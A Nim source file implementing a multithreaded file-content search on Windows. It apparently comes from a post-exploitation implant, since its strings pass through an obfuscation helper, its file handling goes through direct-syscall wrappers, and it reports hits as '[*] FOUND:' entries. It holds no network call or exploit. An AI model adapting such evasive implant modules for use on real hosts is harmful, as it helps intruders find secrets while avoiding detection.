import std/[algorithm, json, locks, strutils]
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import ../utils/winapi/syscall as ntapi
import ../utils/winapi/utils
import execution/core

proc run_search*(args, input, params: string; buf: var openArray[char]): int =
  # Main function that searches files for a term
  type Wchar = uint16

  const
    fileAttributeDirectory = 0x10'u32
    genericRead = 0x80000000'u32
    fileShareRead = 1'u32
    openExisting = 3'u32
    fileAttributeNormal = 0x80'u32
    invalidFileSize = culong(0xFFFFFFFF)
    defaultThreads = 4
    maxThreads = 32
    defaultSizeLimitMb = 200
    maxFiles = 50_000
    invalidFileAttributes = 0xFFFFFFFF'u32
    contextRadius = 500

  type
    Hit = tuple[idx: int, path: string, line: string]
    Ctx = ref object
      lk: Lock
      files: seq[string]
      nextIdx: int
      hits: seq[Hit]
      needle: string
      needleLower: string
      sizeLimitBytes: int
      caseSensitive: bool

  proc normPath(p: string): string =
    # Cleans a path string
    var s = p.strip().replace("/", "\\")
    while s.len > 1 and (s[^1] == '\\'):
      s.setLen(s.len - 1)
    s

  proc paramStr(key: string): string =
    # Reads a string parameter from json
    try:
      let p = parseJson(params)
      if p.hasKey(key):
        return p[key].getStr().strip()
    except JsonParsingError:
      discard
    ""

  proc paramBool(key: string): bool =
    # Reads a boolean parameter from json
    try:
      let p = parseJson(params)
      if not p.hasKey(key):
        return false
      let n = p[key]
      if n.kind == JBool:
        return n.getBool()
      let s = n.getStr().strip().toLowerAscii()
      s in [obf("1"), obf("true"), obf("yes"), obf("on")]
    except JsonParsingError:
      false

  proc paramInt(key: string; defaultVal: int): int =
    # Reads an integer parameter from json
    try:
      let p = parseJson(params)
      if not p.hasKey(key):
        return defaultVal
      let n = p[key]
      if n.kind == JInt:
        return n.getInt()
      return parseInt(n.getStr())
    except Exception:
      defaultVal

  proc skipDot(name: ptr UncheckedArray[Wchar]): bool =
    # Checks that a name is the current or parent entry
    if name[0] != Wchar(ord('.')):
      return false
    if name[1] == 0'u16:
      return true
    name[1] == Wchar(ord('.')) and name[2] == 0'u16

  proc nameFromFind(data: openArray[byte]): string =
    # Reads the entry name from a find record
    let namePtr = cast[ptr UncheckedArray[Wchar]](unsafeAddr data[44])
    var nameArr: array[260, uint16]
    var i = 0
    while i < nameArr.high and namePtr[i] != 0'u16:
      nameArr[i] = namePtr[i]
      inc i
    nameArr[i] = 0'u16
    var cbuf: array[260, char]
    let n = wtoa(nameArr, cbuf)
    if n <= 0:
      return ""
    result = newString(n)
    copyMem(addr result[0], addr cbuf[0], n)

  proc joinPath(base, name: string): string =
    # Joins a base path and a name
    if base.len == 0:
      return name
    if base[^1] == '\\':
      base & name
    else:
      base & "\\" & name

  proc findPattern(dir: string): string =
    # Builds a wildcard pattern for a directory
    if dir.len == 0:
      return "*"
    if dir[^1] == '\\':
      dir & "*"
    else:
      dir & "\\*"

  proc isDirPath(path: string): bool =
    # Checks that a path is a directory
    var w: array[520, uint16]
    asciiWide(path, w)
    let attrs = getFileAttributesW(addr w[0])
    if attrs == invalidFileAttributes:
      return false
    (attrs and fileAttributeDirectory) != 0

  proc readTextFile(path: string; maxBytes: int): string =
    # Reads a text file up to a byte limit
    var w: array[520, uint16]
    asciiWide(path, w)
    let h = createFileW(
      addr w[0], genericRead, fileShareRead, nil, openExisting, fileAttributeNormal, 0)
    if h == invalidHandle:
      return ""
    var hi: culong = 0
    let lo = getFileSize(h, addr hi)
    if lo == invalidFileSize:
      discard ntapi.ntCloseHandle(h)
      return ""
    let total = int((uint64(hi) shl 32) or uint64(lo))
    if total <= 0 or total > maxBytes:
      discard ntapi.ntCloseHandle(h)
      return ""
    var bytes = newSeq[byte](total)
    var offset = 0
    while offset < total:
      let chunk = min(total - offset, 1024 * 1024)
      let n = ntapi.readFile(h, addr bytes[offset], culong(chunk))
      if n == 0:
        bytes.setLen(offset)
        break
      offset += int(n)
    discard ntapi.ntCloseHandle(h)
    if offset == 0:
      return ""
    var nulls = 0
    let probe = min(bytes.len, 8192)
    for i in 0 ..< probe:
      if bytes[i] == 0:
        inc nulls
    if nulls > 2:
      return ""
    result = newString(bytes.len)
    copyMem(addr result[0], addr bytes[0], bytes.len)

  proc matchSnippet(
    raw, needle, needleLower: string; caseSensitive: bool
  ): string =
    # Finds a match and returns a nearby snippet
    if raw.len == 0 or needle.len == 0:
      return ""
    let pos =
      if caseSensitive:
        raw.find(needle)
      else:
        raw.toLowerAscii().find(needleLower)
    if pos < 0:
      return ""
    var lineStart = pos
    while lineStart > 0 and raw[lineStart - 1] notin ['\n', '\r']:
      lineStart -= 1
    var lineEnd = pos
    while lineEnd < raw.len and raw[lineEnd] notin ['\n', '\r']:
      lineEnd += 1
    let line = raw[lineStart ..< lineEnd]
    let matchInLine = pos - lineStart
    var snipStart = matchInLine - contextRadius
    if snipStart < 0:
      snipStart = 0
    var snipEnd = matchInLine + needle.len + contextRadius
    if snipEnd > line.len:
      snipEnd = line.len
    line[snipStart ..< snipEnd]

  proc firstMatchInFile(
    path, needle, needleLower: string; maxBytes: int; caseSensitive: bool
  ): string =
    # Finds the first match inside a file
    let raw = readTextFile(path, maxBytes)
    matchSnippet(raw, needle, needleLower, caseSensitive)

  proc pathExistsFile(path: string): bool =
    # Checks that a path exists
    var w: array[520, uint16]
    asciiWide(path, w)
    getFileAttributesW(addr w[0]) != invalidFileAttributes

  proc collectFiles(root: string; recursive: bool; files: var seq[string]) =
    # Collects files under a root path
    if files.len >= maxFiles:
      return
    if not isDirPath(root):
      if pathExistsFile(root):
        files.add(root)
      return
    var wpat: array[560, uint16]
    asciiWide(findPattern(root), wpat)
    var data: array[592, byte]
    let h = findFirstFileW(addr wpat[0], addr data[0])
    if h == invalidHandle:
      return
    defer:
      discard findClose(h)
    while true:
      let name = cast[ptr UncheckedArray[Wchar]](addr data[44])
      if not skipDot(name):
        let entry = nameFromFind(data)
        let full = joinPath(root, entry)
        let attrs = rdLe32(data, 0)
        let isDir = (attrs and fileAttributeDirectory) != 0
        if isDir:
          if recursive:
            collectFiles(full, recursive, files)
        elif files.len < maxFiles:
          files.add(full)
      zeroMem(addr data[0], data.len)
      if findNextFileW(h, addr data[0]) == 0:
        break

  proc worker(param: pointer) {.stdcall.} =
    # Searches the next file and stores a hit
    let ctx = cast[Ctx](param)
    while true:
      acquire(ctx.lk)
      if ctx.nextIdx >= ctx.files.len:
        release(ctx.lk)
        break
      let idx = ctx.nextIdx
      ctx.nextIdx += 1
      release(ctx.lk)
      let path = ctx.files[idx]
      let snippet = firstMatchInFile(
        path, ctx.needle, ctx.needleLower, ctx.sizeLimitBytes, ctx.caseSensitive
      )
      if snippet.len == 0:
        continue
      acquire(ctx.lk)
      ctx.hits.add((idx, path, snippet))
      release(ctx.lk)

  var root = normPath(paramStr(obf("path")))
  if root.len == 0 and args.strip().len > 0:
    root = normPath(args)
  var needle = paramStr(obf("content"))
  if needle.len == 0:
    return writeErr(obf("missing search term (use --content)"), buf)
  if root.len == 0:
    return writeErr(obf("missing path (use --path)"), buf)

  let recursive = paramBool(obf("recursive"))
  let caseSensitive = paramBool(obf("case_sensitive"))
  var sizeMb = paramInt(obf("size_limit"), defaultSizeLimitMb)
  if sizeMb < 1:
    sizeMb = 1
  let sizeLimitBytes = sizeMb * 1024 * 1024
  var workers = paramInt(obf("thread"), defaultThreads)
  if workers < 1:
    workers = 1
  elif workers > maxThreads:
    workers = maxThreads

  let ctx = Ctx(
    files: @[],
    nextIdx: 0,
    hits: @[],
    needle: needle,
    needleLower: needle.toLowerAscii(),
    sizeLimitBytes: sizeLimitBytes,
    caseSensitive: caseSensitive,
  )
  initLock(ctx.lk)
  collectFiles(root, recursive, ctx.files)
  if ctx.files.len == 0:
    return writeMsg(obf("No files to search"), buf)

  if workers == 1:
    worker(cast[pointer](ctx))
  else:
    var handles: seq[pointer] = @[]
    for _ in 0 ..< workers:
      let th = ntapi.createThread(cast[pointer](worker), cast[pointer](ctx))
      if th != nil:
        handles.add(th)
    for h in handles:
      discard ntapi.waitForObject(h)
      discard ntapi.ntCloseHandle(h)
    if handles.len == 0:
      worker(cast[pointer](ctx))

  ctx.hits.sort(proc(a, b: Hit): int =
    # Compares hits by file index
    cmp(a.idx, b.idx))

  var report = ""
  for h in ctx.hits:
    let shown = h.path.replace("\\", "/")
    report &= obf("[*] FOUND: ") & shown & "\n\n" & obf("Content: ") & "\"" & h.line & "\"\n\n"
  if report.len == 0:
    return writeMsg(obf("No matches"), buf)
  if report.len > buf.len:
    report = report[0 ..< buf.len]
  writeMsg(report, buf)
